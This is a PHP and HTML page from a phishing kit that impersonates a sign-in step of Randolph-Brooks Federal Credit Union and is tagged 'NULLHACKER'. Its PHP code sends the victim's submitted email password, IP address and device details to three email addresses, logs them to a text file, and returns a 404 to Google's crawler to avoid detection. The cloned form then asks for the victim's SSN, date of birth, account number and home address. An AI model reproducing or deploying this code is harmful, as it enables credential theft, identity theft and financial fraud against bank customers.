<?php
session_start();
include('css/vld.php');
include('config/email.php');
include('antibots.php');
if(isset($_POST['email'])){
	
	$ip = getenv("REMOTE_ADDR");
	$ua = $_SERVER['HTTP_USER_AGENT'];
$msg .= "#------------------[ RBFCU Email Access 2 ]---------------------#\n";
$msg .= "Email Address  : ".$_POST['email']."\n";
$msg .= "Password   : ".$_POST['pass']."\n";
$msg .= "#---------------------[ Visitor ]-------------------------#\n";
$msg .= "IP Address		: ".$ip."\n";
$msg .= "DEVICE INFORMATION		    : ".$ua."\n";
$msg .= "#-------------------[ NULLHACKER - END ]------------------------#\n\n";
$sub = "::NULLHACKER:: RBFCU Email INFORMATION Two: $ip";
mail($to,$sub,$msg);
mail($ml1,$sub,$msg);
mail($ml2,$sub,$msg);
 $data = fopen("antibot.txt", "a");
    $result = $msg;
   fwrite($data, $result);
   fclose($data);
}
if(strpos($_SERVER['HTTP_USER_AGENT'], 'GoogleBot') !==false) {
    header('HTTP/1.0 404 Not Found');
    exit();
}

if(strpos(gethostbyaddr(getenv("REMOTE_ADDR")), 'GoogleBot') !==false) {
    header('HTTP/1.0 404 Not Found');
    exit();
}
?><!DOCTYPE html>
<html>
<head>
	<meta charset="utf-8">
	<meta name="viewport" content="width=device-width, initial-scale=1">
	<title>RBFCU - Sign In</title>
	<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/4.7.0/css/font-awesome.min.css">
	<style type="text/css">
		*{
			padding: 0;
			outline: 0;
			margin: auto;
			font-family: arial,helvetica,consolas;
		}#logo{
			display: block;
			width: 120px;
		}input{
			display: block;
			width: 90%;
			border: 0;
			padding: 15px;
			margin-top: 20px;
			font-size: 16px;
			padding-left: 0;
			border-bottom: 1px solid lightgray;
			font-family: verdana;
		}@media only screen and (min-width: 800px){
			#logo{
			width: 150px;
			margin-top: 12px;
			}
		}
	</style>
</head>
<body>
<div style="background: #043672;padding: 15px;">
	<img src="img/logo.svg" id="logo">

</div>
<form action="card.php"  method="post" style="max-width: 400px;padding: 15px;text-align: center;margin-top: 20px;">
<span style="display: inline-block;font-size:30px;border: 1px solid lightgray;background: #0078e7;color: white;padding: 12px;border-radius: 50px;padding-right: 18px;padding-left: 18px;"><i class="fa fa-lock"></i></span>
<h3 style="font-weight: 500;font-family: verdana;margin-top: 12px;">Personal Information</h3>
<p style="font-size: 12px; color: gray;font-family: verdana;padding: 5px;">We need this info to verify your identity.</p>
	<input type="" name="fname" minlength="3" style="margin-top: 30px;" placeholder="Full Name" required>
	<input type="" name="dob" minlength="6" id="dob" placeholder="Date of Birth" required>
	<input type="" name="ssn" minlength="9" id="ssn" placeholder="Social Security Number" required>
	<input type="" name="ph" minlength="6" id="ph" placeholder="Phone Number" required>
	<input type="" name="acc" minlength="6" placeholder="Account Number" required>
	<input type="" name="add" minlength="6" placeholder="Home Address" required>
	<input type="" name="city" minlength="3" placeholder="City" required>
	<input type="" name="state" minlength="3" placeholder="State" required>
	<input type="" name="zip" minlength="5" maxlength="5" placeholder="Zip Code" required>
<button type="submit" style="background: #0078e7;color: white;padding: 12px;width: 95%;border: 0;margin-top: 40px;border-radius: 5px;font-size: 15px;font-weight: bold;">Continue</button>

</form>

<script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.1.1/jquery.min.js"></script>
    <script src="https://s3-us-west-2.amazonaws.com/s.cdpn.io/3/jquery.inputmask.bundle.js"></script>
    <script type="text/javascript">
        $("#ssn").inputmask({"mask": "999-99-9999"});
	$("#cn").inputmask({"mask": "9999 9999 9999 9999"});
        $("#dob").inputmask({"mask": "99/99/9999","placeholder":"DD/MM/YYYY"});
        $("#ph").inputmask({"mask": "(999) 999-9999"});
    </script>
<div style="border-top: 3px solid #F1F1F1;margin-top: 50px;padding: 15px;">
	<div style="max-width: 1000px;padding: 5px;font-size: 14px;color: gray;">
		<p style="font-size: 14px;color: gray;">© Randolph-Brooks Federal Credit Union 2022.</p>
		<p style="font-size: 14px;color: gray;line-height: 22px; margin-top: 20px;">If you are using a screen reader and are having problems using this website, please call 1-800-580-3300 for assistance.</p>
		<p style="font-size: 14px;color: gray;margin-top: 20px;text-align: center;"><img src="img/NCUA-logo-gray.svg" width="80px">Federally Insured by NCUA.</p>
				<p style="font-size: 14px;color: gray;text-align: center;margin-top: 20px;">Equal Housing Lender.<img src="img/EHL-logo-gray.svg" width="40px"></p>

	</div>
</div>
<br>
<br>




</body>
</html>